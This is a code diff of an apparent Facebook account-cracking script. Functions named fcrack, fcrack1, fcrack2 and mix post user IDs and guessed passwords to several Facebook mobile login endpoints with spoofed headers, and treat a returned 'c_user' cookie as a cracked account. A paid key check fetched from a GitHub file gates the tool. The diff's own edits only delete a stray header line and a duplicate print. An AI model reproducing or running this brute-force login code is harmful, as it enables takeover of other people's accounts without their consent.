@@ -754,7 +754,6 @@ def mix(uid,pwx,tl):
     'sec-purpose': 'prefetch;prerender',
     'upgrade-insecure-requests': '1',
      'user-agent': pro}
-    'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -818,7 +817,6 @@ def fcrack(uid,pwx,tl):
     'sec-purpose': 'prefetch;prerender',
     'upgrade-insecure-requests': '1',
      'user-agent': pro}
-    'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -882,7 +880,6 @@ def fcrack1(uid,pwx,tl):
     'sec-purpose': 'prefetch;prerender',
     'upgrade-insecure-requests': '1',
      'user-agent': pro}
-    'viewport-width': '980',}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -948,7 +945,6 @@ def fcrack2(uid,pwx,tl):
     'sec-purpose': 'prefetch;prerender',
     'upgrade-insecure-requests': '1',
      'user-agent': pro}
-    'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -980,7 +976,6 @@ def approval():
     httpCaht = requests.get('https://github.com/emonm7008/xemonxd/blob/main/xemonkey.txt').text
     if id in httpCaht:
       print("\33[1;32mYour Token is Successfully Approved")
-      print('\033[1;93mYour Token is Successfully Approved ')
       psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION EMON KHALIFA ')
       msg = str(os.geteuid())
       time.sleep(0.03)
